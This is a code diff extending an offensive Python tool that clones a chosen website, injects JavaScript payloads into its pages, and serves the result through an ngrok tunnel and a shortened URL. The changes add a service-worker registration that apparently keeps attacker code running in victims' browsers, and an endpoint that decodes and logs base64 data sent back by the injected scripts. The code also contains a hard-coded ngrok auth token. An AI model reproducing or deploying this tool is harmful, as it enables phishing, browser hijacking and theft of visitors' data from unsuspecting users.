@@ -14,13 +14,18 @@ from core.ngrok import ngrok
 class injectionHandler(BaseHTTPRequestHandler):
 	payload = ""
 	url = ""
-	def __init__(self, payload, url, *args, **kwargs):
-		self.payload = payload
-		self.url = url
+	worker = ""
+	def __init__(self, payload, worker, url, *args, **kwargs):
+		self.payload = str(payload)
+		self.worker = str(worker)
+		self.url = str(url)
+
+		#print ("PayLoad=" + str(self.payload) + " - Worker=" + str(self.worker) + " - URL=" + str(self.url))
+
 		super().__init__(*args, **kwargs)
 
 	def inject(self,content):
-
+		payload=""
 		payloadFunctions = """
 		function sendPayload(payload){
 			var xhr = new XMLHttpRequest(); 
@@ -30,7 +35,35 @@ class injectionHandler(BaseHTTPRequestHandler):
 
 		}
 		"""
-		payload = open("payloads/" + self.payload + ".js",'r').read()
+		if (self.worker != "None"):
+			payloadFunctions += """
+		
+		// Service Worker code
+			if ('serviceWorker' in navigator) {
+				navigator.serviceWorker.register('/sw.js').then((registration) => {
+				return navigator.serviceWorker.ready;
+				}).then((registration) => {
+				// register sync
+				
+					registration.sync.register('backgroundSync').then(() => {
+					console.log('sync registered');
+					}).catch(function(error){
+					console.log('Unable to fetch image.');
+					});
+				
+				}).catch(function(error){
+					console.log('Unable to register Service Worker.');
+				});
+			}
+			else{
+			console.log('Service Worker functionality not supported.');
+			}
+
+
+
+			"""
+		if (self.payload != "None"):
+			payload = open("payloads/" + self.payload + ".js",'r').read()
 
 		html = BeautifulSoup(content,features="html.parser")
 		if html.body:
@@ -47,11 +80,20 @@ class injectionHandler(BaseHTTPRequestHandler):
 
 	def do_GET(self):
 		if self.path.startswith("/payload/"):
+			self.send_response(200)
+			self.end_headers()
 			encPayload = str(self.path.split('/')[2])
 			decPayload = str(base64.b64decode(encPayload), "utf-8")
-			print ("RECEIVED PAYLOAD: " + decPayload)
-			self.send_response(200)
+			print ("RECEIVED PAYLOAD: " + decPayload)			
 			return
+
+		if self.path.startswith("/sw.js"):
+			self.send_response(200)
+			self.send_header('Content-type','application/javascript')
+			self.end_headers()
+			self.wfile.write(open("workers/" + self.worker + ".js",'r').read().encode())			
+			return
+
 		self.send_response(200)		
 		self.send_header('Content-type','text/html')
 		self.end_headers()
@@ -66,13 +108,12 @@ def urlShortener(nurl):
 	r = urlopen(url).read() 
 	return str(r.decode())
 
-def startServer(url, port, payload):
+def startServer(url, port, payload, worker):
 	try:
 		#Create a web server and define the handler to manage the incoming request
-		handler = partial(injectionHandler,payload, url)
+		handler = partial(injectionHandler,payload, worker, url)
 		server = HTTPServer(('', port), handler)
-		print ('Started httpserver on port ' , port)
-
+		print ('Started local server on port ' , port)
 		server.serve_forever()
 
 	except KeyboardInterrupt:
@@ -80,6 +121,10 @@ def startServer(url, port, payload):
 		server.socket.close()
 
 def main(args):
+	if (not args["payload"]) and (not args["worker"]):
+		print ("Required Payload (-P) or Service Worker (-S)!")
+		return
+
 	#start ngrok
 	lngrok = ngrok("yQaP2tUKuENSB2YttNqX_5KqoHDiGDbHzGAUDUXePj", str(args["port"]))
 	NgrokURL = lngrok.start()
@@ -87,7 +132,7 @@ def main(args):
 	print ("Public URL: " + NgrokURL)
 	print ("Short URL: " + urlShortener(NgrokURL))
 
-	startServer(args["url"], args["port"], args["payload"])
+	startServer(args["url"], args["port"], args["payload"], args["worker"])
 
 if __name__ == '__main__':
 	version = "1.1.0"
@@ -105,7 +150,8 @@ if __name__ == '__main__':
 	args = argparse.ArgumentParser()
 	args.add_argument("-u", "--url", required=True, help="Website to clone")
 	args.add_argument("-p", "--port", required=False, help="Local server port (default:8080)", default=8080)
-	args.add_argument("-P", "--payload", required=True, help="Payload")
+	args.add_argument("-P", "--payload", required=False, help="Payload")
+	args.add_argument("-W", "--worker", required=False, help="Web worker")
 
 	args = vars(args.parse_args())
 	main(args)
